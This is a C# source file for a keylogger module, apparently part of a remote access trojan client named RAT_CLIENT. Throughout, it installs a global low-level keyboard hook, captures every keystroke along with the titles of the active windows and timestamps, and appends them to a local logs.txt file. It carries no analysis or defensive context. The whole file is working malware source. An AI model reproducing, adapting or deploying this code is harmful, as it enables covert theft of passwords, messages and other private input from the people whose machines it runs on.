using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace RAT_CLIENT
{
	internal static class Keyscan
	{
		private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

		private const int WH_KEYBOARD_LL = 13;

		private const int WM_KEYDOWN = 256;

		private static Timer _Timer;

		private static string strActiveWindowTitle = string.Empty;

		private static IntPtr hHook;

		private static bool CAPS = Control.IsKeyLocked(Keys.Capital);

		private static bool NUM = Control.IsKeyLocked(Keys.NumLock);

		private static bool SCROLL = Control.IsKeyLocked(Keys.Scroll);

		private static LowLevelKeyboardProc proc = KeyboardHookCallback;

		[DllImport("user32.dll")]
		private static extern IntPtr GetForegroundWindow();

		[DllImport("user32.dll")]
		private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

		private static string GetActiveWindowTile()
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			if (GetWindowText(GetForegroundWindow(), stringBuilder, 256) > 0)
			{
				return stringBuilder.ToString();
			}
			return string.Empty;
		}

		private static void Timer_Tick(object sender, EventArgs e)
		{
			string activeWindowTile = GetActiveWindowTile();
			if (strActiveWindowTitle != activeWindowTile && !string.IsNullOrEmpty(activeWindowTile))
			{
				StreamWriter streamWriter = new StreamWriter("logs.txt", append: true);
				streamWriter.Write(Environment.NewLine + Environment.NewLine);
				streamWriter.WriteLine("---------" + activeWindowTile + " (" + DateTime.Now.ToString() + ")---------");
				streamWriter.Close();
				strActiveWindowTitle = activeWindowTile;
			}
		}

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc proc, IntPtr hProc, uint dwThreadID);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool UnhookWindowsHookEx(IntPtr hhk);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

		private static IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			if (nCode >= 0 && wParam == (IntPtr)256)
			{
				int key = Marshal.ReadInt32(lParam);
				StreamWriter streamWriter = new StreamWriter("logs.txt", append: true);
				streamWriter.Write(ProcessKey((Keys)key));
				streamWriter.Close();
			}
			return CallNextHookEx(hHook, nCode, wParam, lParam);
		}

		private static string ProcessKey(Keys Key)
		{
			if (Key == Keys.Capital)
			{
				if (CAPS)
				{
					CAPS = false;
					return "[/CAPS]";
				}
				CAPS = true;
				return "[CAPS]";
			}
			if (Key == Keys.NumLock)
			{
				if (NUM)
				{
					NUM = false;
					return "[/NUM]";
				}
				NUM = true;
				return "[NUM]";
			}
			if (Key == Keys.Scroll)
			{
				if (SCROLL)
				{
					SCROLL = false;
					return "[/SCROLL]";
				}
				SCROLL = true;
				return "[SCROLL]";
			}
			if (Key >= Keys.A && Key <= Keys.Z)
			{
				if (CAPS)
				{
					return Key.ToString();
				}
				return Key.ToString().ToLower();
			}
			if (Key >= Keys.NumPad0 && Key <= Keys.NumPad9)
			{
				return "[" + Key.ToString() + "]";
			}
			if (Key >= Keys.D0 && Key <= Keys.D9)
			{
				return Key.ToString().Remove(0, 1);
			}
			if (Key >= Keys.F1 && Key <= Keys.F12)
			{
				return "[" + Key.ToString() + "]";
			}
			if (Key == Keys.LControlKey || Key == Keys.RControlKey)
			{
				return "[CTRL]";
			}
			if (Key == Keys.LMenu || Key == Keys.RMenu)
			{
				return "[ALT]";
			}
			if (Key == Keys.LWin || Key == Keys.RWin)
			{
				return "[WINDOWS]";
			}
			int num;
			switch (Key)
			{
			case Keys.Apps:
				return "[MENU]";
			default:
				num = ((Key != Keys.Down) ? 1 : 0);
				break;
			case Keys.Left:
			case Keys.Up:
			case Keys.Right:
				num = 0;
				break;
			}
			if (num == 0)
			{
				return "[" + Key.ToString() + "]";
			}
			if (Key >= Keys.Prior && Key <= Keys.End)
			{
				string text = Key.ToString();
				if (text.Contains("Next"))
				{
					text = text.Replace("Next", "PageDown");
				}
				return "[" + text + "]";
			}
			int num2;
			switch (Key)
			{
			case Keys.Space:
				return " ";
			case Keys.Return:
				return Environment.NewLine;
			case Keys.OemPipe:
				return "\\";
			case Keys.OemQuestion:
				return "/";
			case Keys.Tab:
				return "[TAB]";
			default:
				num2 = ((Key != Keys.RShiftKey) ? 1 : 0);
				break;
			case Keys.LShiftKey:
				num2 = 0;
				break;
			}
			if (num2 == 0)
			{
				return "[SHIFT]";
			}
			return Key switch
			{
				Keys.OemPeriod => ".", 
				Keys.Back => "[BACK]", 
				Keys.Pause => "[PAUSE]", 
				Keys.Home => "[HOME]", 
				Keys.Insert => "[INS]", 
				Keys.Delete => "[DEL]", 
				Keys.Oemtilde => "`", 
				Keys.Escape => "[ESC]", 
				Keys.Oemcomma => ",", 
				Keys.OemQuestion => "?", 
				Keys.OemQuotes => "'", 
				Keys.OemSemicolon => ";", 
				_ => (int)Key + " " + Key.ToString(), 
			};
		}

		public static void Start()
		{
			_Timer = new Timer();
			_Timer.Interval = 250;
			_Timer.Tick += Timer_Tick;
			_Timer.Start();
			hHook = SetWindowsHookEx(13, proc, IntPtr.Zero, 0u);
			Application.Run();
			Stop();
			_Timer.Stop();
			_Timer.Dispose();
		}

		public static void Stop()
		{
			Console.WriteLine(hHook);
			UnhookWindowsHookEx(hHook);
			hHook = IntPtr.Zero;
		}
	}
}
